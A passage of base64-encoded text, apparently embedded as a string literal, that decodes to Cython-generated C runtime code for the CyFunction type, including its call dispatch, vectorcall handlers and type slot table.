NfY29kZSk7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfVklTSVQoX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihtKSk7CiNlbmRpZgogICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfdHVwbGUpOwogICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfa3dkaWN0KTsKICAgIFB5X1ZJU0lUKG0tPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIFB5X1ZJU0lUKG0tPmRlZmF1bHRzKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCoKX19QeXhfQ3lGdW5jdGlvbl9yZXByKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKQp7CiAgICBQeU9iamVjdCAqcmVwcjsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVwciA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCI8Y3lmdW5jdGlvbiAlVSBhdCAlcD4iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wLT5mdW5jX3F1YWxuYW1lLCAodm9pZCAqKW9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVwcjsKfQpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpmID0gKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYzsKICAgIFB5Q0Z1bmN0aW9uIG1ldGg7CiAgICBpbnQgZmxhZ3M7CiAgICBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZik7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKICAgIGZsYWdzID0gUHlDRnVuY3Rpb25fR2V0RmxhZ3MoZik7CiAgICBpZiAodW5saWtlbHkoZmxhZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeUNGdW5jdGlvbk9iamVjdCogZiA9IChQeUNGdW5jdGlvbk9iamVjdCopZnVuYzsKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBmLT5tX21sLT5tbF9tZXRoOwogICAgaW50IGZsYWdzID0gZi0+bV9tbC0+bWxfZmxhZ3M7CiNlbmRpZgogICAgUHlfc3NpemVfdCBzaXplOwogICAgc3dpdGNoIChmbGFncyAmIChNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTIHwgTUVUSF9OT0FSR1MgfCBNRVRIX08pKSB7CiAgICBjYXNlIE1FVEhfVkFSQVJHUzoKICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKQogICAgICAgICAg""ICByZXR1cm4gKCptZXRoKShzZWxmLCBhcmcpOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOgogICAgICAgIHJldHVybiAoKihQeUNGdW5jdGlvbldpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBhcmcsIGt3KTsKICAgIGNhc2UgTUVUSF9OT0FSR1M6CiAgICAgICAgaWYgKGxpa2VseShrdyA9PSBOVUxMIHx8IFB5RGljdF9TaXplKGt3KSA9PSAwKSkgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUoYXJnKTsKI2Vsc2UKICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfU2l6ZShhcmcpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSA8IDApKSByZXR1cm4gTlVMTDsKI2VuZGlmCiAgICAgICAgICAgIGlmIChsaWtlbHkoc2l6ZSA9PSAwKSkKICAgICAgICAgICAgICAgIHJldHVybiAoKm1ldGgpKHNlbGYsIE5VTEwpOwogICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsCiAgICAgICAgICAgICAgICAidGFrZXMgbm8gYXJndW1lbnRzIiwgc2l6ZSk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgIGNhc2UgTUVUSF9POgogICAgICAgIGlmIChsaWtlbHkoa3cgPT0gTlVMTCB8fCBQeURpY3RfU2l6ZShrdykgPT0gMCkpIHsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZyk7CiNlbHNlCiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX1NpemUoYXJnKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgPCAwKSkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgICAgICAgICBpZiAobGlrZWx5KHNpemUgPT0gMSkpIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpyZXN1bHQsICphcmcwOwogICAgICAgICAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICBhcmcwID0gUHlUdXBsZV9HRVRfSVRFTShhcmcsIDApOwogICAgICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgICAgIGFyZzAgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oYXJnLCAwKTsgaWYgKHVubGlrZWx5KCFhcmcwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIHJlc3VsdCA9ICgqbWV0aCkoc2VsZiwgYXJnMCk7CiAgICAgICAgICAgICAgICAjaWYgIShDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUykKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihhcmcwKTsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICAgICAgfQog""ICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsCiAgICAgICAgICAgICAgICAidGFrZXMgZXhhY3RseSBvbmUgYXJndW1lbnQiLCBzaXplKTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfU3lzdGVtRXJyb3IsICJCYWQgY2FsbCBmbGFncyBmb3IgQ3lGdW5jdGlvbiIpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKAogICAgICAgIChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jLCAidGFrZXMgbm8ga2V5d29yZCBhcmd1bWVudHMiKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdykgewogICAgUHlPYmplY3QgKnNlbGYsICpyZXN1bHQ7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5mdW5jKTsKICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fc2VsZjsKI2VuZGlmCiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgYXJnLCBrdyk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9DYWxsQXNNZXRob2QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmdzLCBQeU9iamVjdCAqa3cpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jOwojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKQogICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjID0gX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoY3lmdW5jKTsKICAgIGlmICh2YykgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIHJldHVybiBfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KGZ1bmMsIHZjLCAmUHlUdXBsZV9HRVRfSVRFTShhcmdzLCAwKSwgKHNpemVfdClQeVR1cGxlX0dFVF9TSVpFKGFyZ3MpLCBrdyk7CiNlbHNlCiAgICAgICAgKHZvaWQpICZfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0OwogICAgICAgIHJldHVybiBQeVZlY3RvcmNh""bGxfQ2FsbChmdW5jLCBhcmdzLCBrdyk7CiNlbmRpZgogICAgfQojZW5kaWYKICAgIGlmICgoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTKSAmJiAhKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCkpIHsKICAgICAgICBQeV9zc2l6ZV90IGFyZ2M7CiAgICAgICAgUHlPYmplY3QgKm5ld19hcmdzOwogICAgICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBhcmdjID0gUHlUdXBsZV9HRVRfU0laRShhcmdzKTsKI2Vsc2UKICAgICAgICBhcmdjID0gUHlUdXBsZV9TaXplKGFyZ3MpOwogICAgICAgIGlmICh1bmxpa2VseShhcmdjIDwgMCkpIHJldHVybiBOVUxMOwojZW5kaWYKICAgICAgICBuZXdfYXJncyA9IFB5VHVwbGVfR2V0U2xpY2UoYXJncywgMSwgYXJnYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdfYXJncykpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIHNlbGYgPSBQeVR1cGxlX0dldEl0ZW0oYXJncywgMCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSkgewogICAgICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpOwogICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAgInVuYm91bmQgbWV0aG9kICUuMjAwUygpIG5lZWRzIGFuIGFyZ3VtZW50IiwKICAgICAgICAgICAgICAgICAgICAgICAgIGN5ZnVuYy0+ZnVuY19xdWFsbmFtZSk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgbmV3X2FyZ3MsIGt3KTsKICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoZnVuYywgYXJncywga3cpOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKQp7CiAgICBpbnQgcmV0ID0gMDsKICAgIGlmICgoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTKSAmJiAhKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCkpIHsKICAgICAgICBpZiAodW5saWtlbHkobmFyZ3MgPCAxKSkgewogICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoCiAgICAgICAgICAgICAgICBjeWZ1bmMsICJuZWVkcyBhbiBhcmd1bWVudCIpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIHJl""dCA9IDE7CiAgICB9CiAgICBpZiAodW5saWtlbHkoa3duYW1lcykgJiYgdW5saWtlbHkoX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKSkpIHsKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoCiAgICAgICAgICAgIGN5ZnVuYywgInRha2VzIG5vIGtleXdvcmQgYXJndW1lbnRzIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIHJldDsKfQpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKQp7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7CiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTAogICAgUHlfc3NpemVfdCBuYXJncyA9IChQeV9zc2l6ZV90KW5hcmdzZjsKI2Vsc2UKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTsKI2VuZGlmCiAgICBQeU9iamVjdCAqc2VsZjsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpOwogICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDsKI2VuZGlmCiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywga3duYW1lcykpIHsKICAgIGNhc2UgMToKICAgICAgICBzZWxmID0gYXJnc1swXTsKICAgICAgICBhcmdzICs9IDE7CiAgICAgICAgbmFyZ3MgLT0gMTsKICAgICAgICBicmVhazsKICAgIGNhc2UgMDoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPmZ1bmMpOwogICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICAgICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fc2VsZjsKI2VuZGlmCiAgICAgICAgYnJlYWs7CiAgICBkZWZhdWx0OgogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgaWYgKHVubGlrZWx5KG5hcmdzICE9IDApKSB7CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV9hcmd1bWVudF9jb3VudF9lcnJvcigKICAgICAgICAgICAgY3lmdW5jLCAidGFrZXMgbm8gYXJndW1lbnRzIiwgbmFyZ3MpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmV0dXJuIG1ldGgoc2VsZiwgTlVMTCk7Cn0Kc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9W""ZWN0b3JjYWxsX08oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpCnsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYzsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmOwojZWxzZQogICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpOwojZW5kaWYKICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoOwojZW5kaWYKICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBrd25hbWVzKSkgewogICAgY2FzZSAxOgogICAgICAgIHNlbGYgPSBhcmdzWzBdOwogICAgICAgIGFyZ3MgKz0gMTsKICAgICAgICBuYXJncyAtPSAxOwogICAgICAgIGJyZWFrOwogICAgY2FzZSAwOgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmOwojZW5kaWYKICAgICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBpZiAodW5saWtlbHkobmFyZ3MgIT0gMSkpIHsKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICBjeWZ1bmMsICJ0YWtlcyBleGFjdGx5IG9uZSBhcmd1bWVudCIsIG5hcmdzKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIHJldHVybiBtZXRoKHNlbGYsIGFyZ3NbMF0pOwp9CnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEUyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykKewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jOwojaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7CiNlbHNlCiAg""ICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7CiNlbmRpZgogICAgUHlPYmplY3QgKnNlbGY7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTsKICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7CiNlbmRpZgogICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIE5VTEwpKSB7CiAgICBjYXNlIDE6CiAgICAgICAgc2VsZiA9IGFyZ3NbMF07CiAgICAgICAgYXJncyArPSAxOwogICAgICAgIG5hcmdzIC09IDE7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIDA6CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTsKICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7CiNlbmRpZgogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIHJldHVybiAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBhcmdzLCBuYXJncywga3duYW1lcyk7Cn0Kc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykKewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jOwogICAgUHlUeXBlT2JqZWN0ICpjbHMgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooY3lmdW5jKTsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmOwojZWxzZQogICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpOwojZW5kaWYKICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0""KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoOwojZW5kaWYKICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBOVUxMKSkgewogICAgY2FzZSAxOgogICAgICAgIHNlbGYgPSBhcmdzWzBdOwogICAgICAgIGFyZ3MgKz0gMTsKICAgICAgICBuYXJncyAtPSAxOwogICAgICAgIGJyZWFrOwogICAgY2FzZSAwOgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmOwojZW5kaWYKICAgICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICByZXR1cm4gKChfX1B5eF9QeUNNZXRob2QpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgY2xzLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd25hbWVzKTsKfQojZW5kaWYKc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0N5RnVuY3Rpb25UeXBlX3Nsb3RzW10gPSB7CiAgICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX2RlYWxsb2N9LAogICAge1B5X3RwX3JlcHIsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9yZXByfSwKICAgIHtQeV90cF9jYWxsLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fQ2FsbEFzTWV0aG9kfSwKICAgIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX3RyYXZlcnNlfSwKICAgIHtQeV90cF9jbGVhciwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyfSwKICAgIHtQeV90cF9tZXRob2RzLCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc30sCiAgICB7UHlfdHBfbWVtYmVycywgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX21lbWJlcnN9LAogICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX2dldHNldHN9LAogICAge1B5X3RwX2Rlc2NyX2dldCwgKHZvaWQgKilfX1B5eF9QeU1ldGhvZF9OZXd9LAogICAgezAsIDB9LAp9OwpzdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfQ3lGdW5jdGlvblR5cGVfc3BlYyA9IHsKICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiY3l0aG9uX2Z1bmN0aW9uX29yX21ldGhvZCIsCiAgICBzaXplb2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCksCiAgICAwLAojaWZkZWYgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUgogICAgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUiB8CiNlbmRpZgojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKI2lmIGRlZmluZWQoUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwpCiAgICBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCB8CiNlbGlmIGRlZmluZWQoX1B5""X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMKQogICAgX1B5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMIHwKI2VuZGlmCiNlbmRpZiAvLyBDWVRIT05fTUVUSF9GQVNUQ0FMTAojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMAogICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHwKI2VuZGlmCiAgICBQeV9UUEZMQUdTX0RFRkFVTFQgfCBQeV9UUEZMQUdTX0hBVkVfR0Mg